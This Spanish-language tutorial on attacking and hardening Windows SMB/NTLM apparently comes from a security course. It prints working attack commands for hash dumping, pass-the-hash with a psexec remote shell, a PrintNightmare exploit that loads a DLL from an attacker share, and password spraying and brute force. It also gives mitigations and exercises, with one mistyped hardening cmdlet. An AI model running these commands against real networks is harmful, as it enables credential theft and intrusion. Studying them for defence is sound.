¿Qué es SMB?

El protocolo de recursos compartidos de Windows

SMB (Server Message Block) permite compartir archivos, impresoras y named pipes entre nodos de una red Windows. Es la columna vertebral de los entornos Active Directory y uno de los protocolos más atacados en entornos corporativos.

Puertos y versiones:
  • TCP/445 — SMB directo (moderno, todo Windows desde 2000)
  • TCP/139 — SMB sobre NetBIOS (legacy)
  • SMBv1 — Windows XP/2003. Vulnerable a EternalBlue (MS17-010). Debe estar DESACTIVADO.
  • SMBv2 — Windows Vista/2008+. Mejoras de rendimiento. Sin cifrado nativo.
  • SMBv3 — Windows 8/2012+. Cifrado AES, compresión, multichannel.

Autenticación NTLM — Challenge/Response

El mecanismo que hace posible Pass-the-Hash y SMB Relay

Cliente (WORKSTATION)              Servidor (\\SERVER)
      │                                    │
      │──── SMB_COM_NEGOTIATE ────────────►│  "¿Qué versiones soportás?"
      │◄─── SMB_COM_NEGOTIATE_RESPONSE ─── │
      │                                    │
      │──── SESSION_SETUP_REQ ────────────►│  NTLMSSP_NEGOTIATE
      │◄─── SESSION_SETUP_RESP ─────────── │  Challenge = 8 bytes random
      │                                    │
      │──── SESSION_SETUP_REQ ────────────►│  NTLMSSP_AUTH
      │     Response = HMAC_MD5(NTHash, Challenge)
      │     Usuario=jperez  Dominio=CORP
      │◄─── SESSION_SETUP_RESP ─────────── │  STATUS_SUCCESS
      │                                    │
      └── TREE_CONNECT → acceso al share ──┘

PROBLEMA FUNDAMENTAL:
  NTHash = MD4(contraseña)  → el servidor verifica con el HASH
  → Si robás el hash, podés autenticarte SIN la contraseña real
Kerberos vs NTLM: los entornos modernos usan Kerberos en dominio (con tickets que caducan). NTLM se usa como fallback cuando no hay DC accesible, en workgroups, o con IPs directas. Muchos ataques fuerzan el fallback a NTLM deliberadamente.

Ataque 1: Pass-the-Hash

Usar el hash como contraseña

El atacante obtiene el hash NTLM de un usuario (vía Mimikatz, secretsdump, SAM dump) y lo usa directamente para autenticarse sin necesidad de crackear la contraseña.

OBTENCIÓN DEL HASH:
  mimikatz# sekurlsa::logonpasswords
  → NTLM: aad3b435b51404eeaad3b435b51404ee (admin local)

  secretsdump.py -just-dc CORP/admin@192.168.1.1
  → Extrae todos los hashes del DC

PASS-THE-HASH con impacket:
  smbclient.py -hashes :aad3b435b51404eeaad3b435b51404ee \
    CORP/Administrator@192.168.1.10
  → Acceso completo al servidor como Administrator

  psexec.py -hashes :HASH CORP/Administrator@192.168.1.10 cmd.exe
  → Shell remota via SMB (¡sin contraseña!)

ALCANCE: cualquier servicio que use NTLM es vulnerable:
  SMB, RDP (NLA desactivado), WMI, MSSQL, HTTP/NTLM, LDAP

MITRE ATT&CK: T1550.002 — Use Alternate Authentication Material: Pass-the-Hash

Detección y mitigación

Hardening SMB para entornos corporativos

  • 🚫 Deshabilitar SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false
  • 🔐 SMB Signing obligatorio: previene SMB relay — Set-SmbServerConfiguration -RequireSecuritySignature $true
  • 🛡️ Deshabilitar LLMNR y NBT-NS: previene envenenamiento → fuente del relay
  • 🔒 Protected Users group: fuerza Kerberos, deshabilita NTLM para cuentas privilegiadas
  • 📋 Credential Guard: protege hashes en memoria (previene Mimikatz)
  • 🌐 Segmentación: bloquear TCP/445 entre segmentos, solo hacia file servers autorizados
  • 📊 Alertar Event 4625 masivos + accesos a C$: correlación SIEM crítica

Windows Print Spooler — usuario normal → SYSTEM

PrintNightmare es una vulnerabilidad crítica en el servicio Windows Print Spooler. Cualquier usuario autenticado del dominio puede invocar RpcAddPrinterDriverEx() para instalar un driver DLL malicioso. El servicio Spooler corre como SYSTEM, por lo que la DLL obtiene privilegios máximos.

VECTORES:
  CVE-2021-1675:  RCE remoto vía SMB + RPC  (parche inicial incompleto)

     rpcdump.py @TARGET | grep -i spooler

     python3 CVE-2021-1675.py 'DOMAIN/user:pass'@TARGET '\\attacker\share\evil.dll'

Ataque 6: SMB Brute Force

Descubrir credenciales válidas en SMB mediante diccionario o spray

SMB expuesto al exterior o en redes internas puede ser blanco de ataques de fuerza bruta. La técnica de Password Spraying prueba pocas contraseñas contra muchos usuarios, evitando el lockout. Credential Stuffing usa listas de credenciales filtradas.

TIPOS DE ATAQUE:

1. ENUMERACIÓN DE USUARIOS (sin credenciales):
   enum4linux -U TARGET     → lista usuarios via RPC
   crackmapexec smb TARGET --users  → enumerar cuentas del dominio
   impacket-lookupsid DOMAIN/user:pass@TARGET → SIDs → usuarios

2. PASSWORD SPRAYING (un password, muchos usuarios):
   Objetivo: evitar lockout (típicamente 5 intentos antes del bloqueo)
   crackmapexec smb TARGET -u users.txt -p "Password2024!" --continue-on-success
   Señal de éxito: "[+] DOMAIN\user:Password2024! (Pwn3d!)"

3. CREDENTIAL STUFFING (listas filtradas):
   crackmapexec smb TARGET -u creds.txt -p creds.txt --no-bruteforce
   Usa pares usuario:contraseña de dumps (RockYou, etc.)

4. BRUTE FORCE CLÁSICO (pocas cuentas, muchas contraseñas):
   hydra -l Administrator -P rockyou.txt smb://TARGET
   Riesgo: lockout de cuentas si hay política de bloqueo activa

INDICADORES DE COMPROMISO:
  Event 4625: Logon failed (multiple en poco tiempo)
  Event 4771: Kerberos pre-auth failed
  Zeek: smb_auth.log, múltiples intentos con distintos users desde misma IP
  SIEM: >10 fallos de auth SMB por minuto desde una IP

DETECCIÓN AVANZADA:
  Account lockout threshold < 5 intentos
  MFA para cuentas privilegiadas
  Honeypot: cuenta "admin" con alertas en cualquier intento de login

MITRE ATT&CK: T1110 — Brute Force · T1087 — Account Discovery

EJ-01 ¿Por qué Pass-the-Hash funciona contra NTLM? Fácil

Explicá por qué NTLM es vulnerable a Pass-the-Hash. ¿Qué debería cambiar en el protocolo para que PtH no funcionara? ¿Por qué Microsoft no simplemente "arregla" NTLM?

POR QUÉ FUNCIONA PtH: En NTLM, el "secreto" que demuestra identidad NO es la contraseña en sí, sino el HASH de la contraseña (NTHash = MD4(contraseña)). Flujo de autenticación NTLM: Cliente → Servidor: "quiero autenticarme" Servidor → Cliente: Challenge (8 bytes aleatorios) Cliente → Servidor: Response = HMAC-MD5(NTHash, Challenge + contexto) Servidor verifica: computa el mismo HMAC con el NTHash que tiene almacenado PROBLEMA: el servidor almacena y usa el NTHash como secreto. Si tenés el NTHash → podés calcular el Response → te autenticás. La contraseña real nunca viaja por la red → y tampoco es necesaria. QUÉ DEBERÍA CAMBIAR: Para que PtH no funcione, el secreto que circula en el auth debería ser derivado de algo que NO se almacena en el servidor: → Kerberos con tickets: el DC emite tickets usando clave del usuario (derivada de la contraseña), pero el ticket mismo caduca y no puede ser reutilizado directamente (aunque hay Pass-the-Ticket) → Challenge que incluya timestamp + nonce per-session para que el Response no sea reproducible fuera del contexto original POR QUÉ MICROSOFT NO "ARREGLA" NTLM: → Compatibilidad hacia atrás: miles de aplicaciones legacy usan NTLM → Workgroups sin dominio: sin DC, Kerberos no existe → Fallback inevitable: cuando el DC no está disponible → Microsoft ya "dejó de recomendar NTLM" (deprecado en 2023) y recomienda Kerberos + Protected Users Group → El fix real es no usar NTLM, no parchear NTLM
EJ-02 ¿Por qué SMB Signing previene el relay? Fácil

Si SMB Signing está habilitado, el relay falla. Explicá por qué técnicamente. ¿Qué firma exactamente? ¿El signing está habilitado por defecto en Windows?

QUÉ ES SMB SIGNING: Cada mensaje SMB lleva una firma digital calculada con la clave de sesión derivada del NTHash del usuario autenticado. El receptor verifica la firma antes de procesar el mensaje. POR QUÉ PREVIENE EL RELAY: En el relay, el atacante actúa como intermediario: Víctima → Atacante → Target Cuando se establece la sesión, se genera una "session key": SessionKey = HMAC_MD5(NTHash, NT_Response) PROBLEMA para el atacante: → El atacante no tiene el NTHash (solo tiene el challenge/response en tránsito, no puede extraer el hash) → Sin NTHash → no puede calcular la SessionKey → Sin SessionKey → no puede firmar los mensajes SMB → El servidor Target rechaza mensajes sin firma válida → El relay falla inmediatamente después de la autenticación ESTADO POR DEFECTO EN WINDOWS: ┌─────────────────────┬──────────────────┬─────────────────────────┐ │ Sistema │ Clientes (DC) │ Servidores miembro │ ├─────────────────────┼──────────────────┼─────────────────────────┤ │ Domain Controllers │ Required │ Required (desde 2022) │ │ Domain Members │ Enabled (no req) │ Enabled (no req) │ │ Workgroup │ Disabled │ Disabled │ └─────────────────────┴──────────────────┴─────────────────────────┘ "Enabled but not required" = el servidor acepta sesiones sin firma → El atacante negocia "no signing" → el relay funciona igual MITIGACIÓN: SetSmbServerConfiguration -RequireSecuritySignature $true en TODOS los servidores y clientes del dominio.
